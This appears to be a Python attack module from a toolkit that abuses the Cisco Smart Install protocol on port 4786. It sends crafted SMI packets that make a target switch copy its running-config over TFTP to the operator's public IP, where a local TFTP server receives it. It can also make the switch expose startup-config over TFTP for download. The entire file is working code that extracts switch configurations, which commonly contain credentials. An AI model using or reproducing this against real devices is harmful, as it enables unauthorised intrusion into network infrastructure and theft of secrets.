#!/usr/bin/env python3

import asyncio
from collections.abc import AsyncGenerator
from contextlib import asynccontextmanager

from brutasse.smi.proto import (
    BackupDone,
    BackupReq,
    CapabilitiesReq,
    CapabilitiesResp,
    Pkt,
    TlvLocal,
    TlvRemote,
    TlvSeq,
)
from brutasse.tftp.protocol import (
    Client,
    RequestHandler,
    TftpReadRequest,
    TftpServer,
    TftpWriteRequest,
)
from brutasse.utils import IPAddress, Stream, get_public_ip, tcp_connect


class IbdClient:
    """Smart Install IBD client."""

    def __init__(self, stream: Stream):
        self.stream = stream

    async def get_capabilities(self):
        """Get the capabilities of the remote server.

        This is mostly useful to check that the server understands the SMI
        protocol, and is in IBC mode."""
        req = Pkt(version=0, body=CapabilitiesReq(1, 0))
        await req.build_stream(self.stream)

        resp = await Pkt.parse_stream(self.stream)
        assert resp == Pkt(version=0, body=CapabilitiesResp(1, 0))

    async def start_backup_local(self):
        req = Pkt(
            version=0,
            body=BackupReq(
                tlvs=[
                    TlvSeq(1, 0, bytes(6)),
                    TlvLocal("configure tftp-server nvram:startup-config"),
                ]
            ),
        )
        await req.build_stream(self.stream)

        # Note: the switch should connect back on port 4786 to send a
        # BackupResp

        # TODO: do the tftp get

    async def stop_backup_local(self):
        req = Pkt(version=0, body=BackupDone(result=1))
        await req.build_stream(self.stream)

    @asynccontextmanager
    async def backup_local(self) -> AsyncGenerator[None]:
        """Enable the "local" backup."""
        # Copy startup-config and enable tftp server
        await self.start_backup_local()

        # We need to wait for the command to be processed.
        # Since the previous one doesn't send a response back, we make a dummy
        # capabilities request.
        await self.get_capabilities()

        try:
            # The target switch should expose startup-config at the root of its
            # tftp server
            yield
        finally:
            await self.stop_backup_local()

    async def backup_remote(self, tftp_host: str, filename: str = "running-config"):
        # TODO: listen with tftp server

        req = Pkt(
            version=0,
            body=BackupReq(
                tlvs=[
                    TlvSeq(1, 0, bytes(6)),
                    TlvRemote(
                        f"copy system:running-config tftp://{tftp_host}/{filename}",
                        "",
                        "",
                    ),
                ]
            ),
        )
        await req.build_stream(self.stream)

        # Note: the switch will connect back on port 4786 to send a response


async def get_config_remote(host: IPAddress, port: int = 4786) -> bytes:
    config: asyncio.Future[bytes] = asyncio.Future()

    class TftpHandler(RequestHandler):
        async def on_read_request(self, req: TftpReadRequest) -> None:
            await req.reject()

        async def on_write_request(self, req: TftpWriteRequest) -> None:
            data = await req.accept()
            config.set_result(data)

    async with TftpServer(TftpHandler(), port=69):
        my_ip = get_public_ip()

        stream = await tcp_connect(host, port)
        try:
            smi_client = IbdClient(stream)
            await smi_client.backup_remote(str(my_ip), str(host))
            return await config
        finally:
            await stream.close()


async def get_config_local(host: IPAddress, port: int = 4786) -> bytes:
    stream = await tcp_connect(host, port)
    try:
        smi_client = IbdClient(stream)
        async with smi_client.backup_local():
            async with Client.create(str(host), 69) as tftp_client:
                return await tftp_client.get_file("startup-config")
    finally:
        await stream.close()
